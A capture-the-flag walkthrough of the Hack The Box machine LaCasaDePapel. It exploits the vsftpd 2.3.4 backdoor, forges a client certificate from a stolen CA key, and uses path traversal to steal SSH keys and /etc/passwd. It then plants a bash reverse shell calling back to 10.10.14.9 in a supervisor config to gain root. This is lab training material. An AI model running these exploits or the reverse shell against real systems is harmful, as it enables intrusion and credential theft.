<h2>Target: 10.10.10.131 LaCasaDePapel</h2><br>

<b>Initial Access:</b><br>
nmap -Pn 10.10.10.131 --min-rate=5000 -p-|grep open|awk -F '/' '{print $1}'|tr '\n' ',' <br>
Output shows open ports: 21,22,80,443

Enumerate these open ports further with nmap: <br>
nmap -Pn 10.10.10.131 --min-rate=5000 -p 21,22,80,443 -sC -sV -oN nmap.LaCasaDePapel
 
![image](https://user-images.githubusercontent.com/93153300/205336565-24cb78c6-f33a-4e50-8a28-d77eaa5d0e45.png)
 
Nmap shows on port 443 that the certificate has a commonName of lacasadepapel.htb.  Add that into the file /etc/hosts: 10.10.10.131 lacasadepapel.htb

Visiting port 80 shows we need a password.  We don’t have a password so let’s take a look at port 443.  Port 443 shows we need a client certificate to access the site:
 
![image](https://user-images.githubusercontent.com/93153300/205336684-42a7964c-9593-4420-8454-eaaaefd51933.png)


We don’t have a client certificate so let’s take a look at port 21.  Nmap shows port 21 is vsftpd version 2.3.4.  This version has a known backdoor exploit.  Find the exploit with command: searchsploit vsftpd: 
 
![image](https://user-images.githubusercontent.com/93153300/205336736-b73a9928-a941-4e86-881b-401cf8a0b120.png)
 
Download the backdoor: searchsploit -m 49757.py <br>
Run the exploit: python 49757.py 10.10.10.131

The exploit opened up the backdoor on port 6200.  Connect to port 6200: telnet 10.10.10.131 6200

This exploit is pretty simple to do manually: <br>
Step 1: Connect to the target on ftp: ftp 10.10.10.131 <br>
Step 2: Enter any username and append a smiley face to the end of the username, like this: john:) <br>
Step 3: Enter any password <br>
Step 4: Connect to port 6200: telnet 10.10.10.131 6200 

Usually this exploit opens a bash shell.  However, in this case the service on port 6200 does not open a bash shell:
  
![image](https://user-images.githubusercontent.com/93153300/205336769-7a9bd273-3f2c-4c65-abc1-5615f9a93537.png)
 
This is a Psy Shell, which is a runtime developer console, interactive debugger, and REPL for PHP.  To get some basic information run command: phpinfo();
The output shows a number of disabled functions:  
 
![image](https://user-images.githubusercontent.com/93153300/205336807-a6a7d3c4-8081-41e2-b202-5355730c363d.png)
   
So if we run a disabled command it fails and we get a warning that the command has been disabled: 
 
![image](https://user-images.githubusercontent.com/93153300/205336851-e1c34978-9b75-45ef-806b-a3a6fe8499d1.png)
 
Run command ls -al.  We get a return of a variable called $tokyo.  Next, run command: show $tokyo
We find an interesting file path of ‘/home/nairobi/ca.key’:
 
![image](https://user-images.githubusercontent.com/93153300/205336874-a7759d84-e37a-4034-a204-65e6826efc5f.png)
  
If we can get the ca.key file we can use that to create the client certificate we need to get access to port 443.  To enumerate the Psysh shell further, we can use ‘scandir’ to list files, and ‘file_get_contents’ to read files.   Running command file_get_contents('/home/nairobi/ca.key') shows the private key:

![image](https://user-images.githubusercontent.com/93153300/205336912-d43129b6-7658-494a-a4b9-1dbfe3b2de6a.png)

Copy the private key we got from the ca.key file to our local kali.  We will name the file ca-nairobi.key.  For this key to work we need to format it correctly.  Remove all the \n, and remove all the spaces at the beginning of each line.  These are the steps for creating and uploading the client certificate to port 443:

*(We will put numbers with the filenames to make it easier to keep track of the files)<br>
Step 1: Create a request certificate file:  openssl req -new -key 0ca-nairobi.key -out 1client.csr <br>
Step 2: Visit port 443 and click on ‘View Certificate’:
 
![image](https://user-images.githubusercontent.com/93153300/205336958-37c7bf3c-552c-4a7f-ac3c-40dde39245c9.png)

Step 3: Going through the certificate we opened on port 443, download the ‘PEM(cert)’ file by clicking on it:
 
![image](https://user-images.githubusercontent.com/93153300/205337018-46950fe1-4bdc-44ba-b4c7-423e72ddb6ca.png)

We are downloading this ‘PEM(cert)’ file because we will need it for the next step.  The downloaded file is automatically named ‘lacasadepapel-htb.pem’.  We will change the name to ‘2lacasadepapel-htb.pem’<br>
Step 4: Create the client certificate: openssl x509 -req -days 365 -in 1client.csr -CA 2lacasadepapel-htb.pem -CAkey 0ca-nairobi.key -out 3client.crt <br>
Step 5: Change the 3client.crt into a file format that firefox can import: openssl pkcs12 -export -inkey 0ca-nairobi.key -in 3client.crt -out 4client.pfx <br>
Step 6: Go to the Firefox settings and search for ‘cert’:
 
![image](https://user-images.githubusercontent.com/93153300/205337045-e8132942-f003-4a18-9c43-b8b7d50eef89.png)

Click on ‘View Certificates’. Go to ‘Your Certificates’, and click on ‘Import’:
 
![image](https://user-images.githubusercontent.com/93153300/205337076-f580cc81-b2b9-4410-a732-05412a491396.png)
 
Import the ‘4client.pfx’ file. <br>
Step 7: Go back to port 443 and click on the lock to the left of the url:
 
![image](https://user-images.githubusercontent.com/93153300/205337105-0be44247-cb4d-4bfc-ad9c-258db1345440.png)
 
After clicking on the lock, you'll see a ‘connection not secure’ option, click on that.  After clicking on 'connection not secure' you'll see a 'Remove Exception’ option, click on that.   <br>
Step 8: Refresh port 443 and we are now able to see the page content:
 
![image](https://user-images.githubusercontent.com/93153300/205337139-06cefe9a-b24f-415a-b73d-de6af834f2cd.png)

Click on ‘Season-1’. The url becomes: https://10.10.10.131/?path=SEASON-1.  Test for directory traversal by replacing ‘Season-1’ with ‘../’:
 
![image](https://user-images.githubusercontent.com/93153300/205337177-48fcd564-de54-43ed-b7de-28e3977754ce.png)

This shows we have directory traversal.   After looking around with directory traversal for some time, we find that there is not much to do with this vulnerability alone.  As we can only see files, but when we try to read them it runs into errors.  

Click again on Season-1.  The page shows:
 
![image](https://user-images.githubusercontent.com/93153300/205337196-1ed82c23-3563-4bd5-9151-281aee64a2ce.png)
 
Click on one of these files and capture the request in burp suite.  The captured request in burp suite shows that it reaches out to a directory of /file/U0VBU09OLTIvMDEuYXZp.  Use ‘Inspector’ (located on the right side in burp suite) to decode the string:
 
![image](https://user-images.githubusercontent.com/93153300/205337224-f5e00bac-2845-4054-982a-74eb08a80e4a.png)
 
Inspector shows that it’s base64 of the file we chose to download.  We saw from the directory traversal that there is a .ssh directory.  Use this capture we have in burp suite to read the id_rsa of the user.

Step 1: Use the directory traversal to confirm that there is a ‘id_rsa’ file.  Put in the url path: ‘Path=../.ssh’
 
![image](https://user-images.githubusercontent.com/93153300/205337250-e7c3dc3a-f5e1-4e75-8ef4-6e28f2b46623.png)
 
We confirmed that their is an ‘id_rsa’ file.  <br>
Step 2: Base64 encode the file location.  The file location we found with the directory traversal is ‘../.ssh/id_rsa’.  Replace the /file/U0VBU09OLTIvMDEuYXZp with /file/../.ssh/id_rsa.  <br>
Step 3: Use burp suite to base64 encode (Ctrl+B) the ../.ssh/id_rsa part, and send the request:
 
![image](https://user-images.githubusercontent.com/93153300/205337291-0130fa0e-1213-425d-9666-bd7a23ad75dd.png)
 
The burp suite capture returns the id_rsa private key.  Copy the private key into a file.  Change the key permission using command: chmod 600 id_rsa <br> 
To find the user associated to this private key perform the same steps as we did above to get the id_rsa, but this time get the id_rsa.pub file instead.  The id_rsa.pub file contains the username.  After performing these steps on id_rsa.pub we find the username is berlin.  

The ssh login doesn’t work for berlin.  Let’s try the private ssh key on the other users, maybe it’s their private ssh key.  To get the usernames on the target use the same steps we used to get the private ssh key, but instead of getting the file id_rsa get the file /etc/passwd.  The file /etc/passwd reveals the usernames: dali, berlin, nairobi, oslo, professor.  

Put these usernames in a file and call the filename ‘ulist’.  Next, run a for loop for ssh login with the private ssh key: for user in \`cat ulist\`;do ssh -i id_rsa $user@10.10.10.131 -o batchmode=yes;done

The key worked for username professor.  We now have a shell as professor.  
______________________________________________________________________
<b>Privilege Escalation:</b><br>
In the directory /home/professor we see 2 memcached files: memcached.ini and memcached.js.  Opening memcached.ini shows:
 
![image](https://user-images.githubusercontent.com/93153300/205337322-610cc0ed-f5c1-498e-b78c-ccaf5a0a3a6d.png)
 
Seems like memcached.ini is a programmed command to run memcached.js.  This may be a cron that runs often (even though pspy didn't show this).  To check this theory do the following:

Step 1: We don’t have permissions to write to the file memcached.ini, but we do have permissions to move the file to a different directory and create a new file with the name memcached.ini.  To move the file to a different directory run the command: mv memcached.ini /dev/shm <br>
Step 2: Create a file named memcached.ini and put a bash reverse shell in this file.  It should look like this: <br>
[program:memcached] <br>
command = /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.9/443 0>&1' <br>
Step 3: Open a netcat listener (we will use pwncat because it gives a better shell): pwncat-cs -lp 443

After a few moments our pwncat gets a shell as user root.  We can get the flag in /root/root.txt.
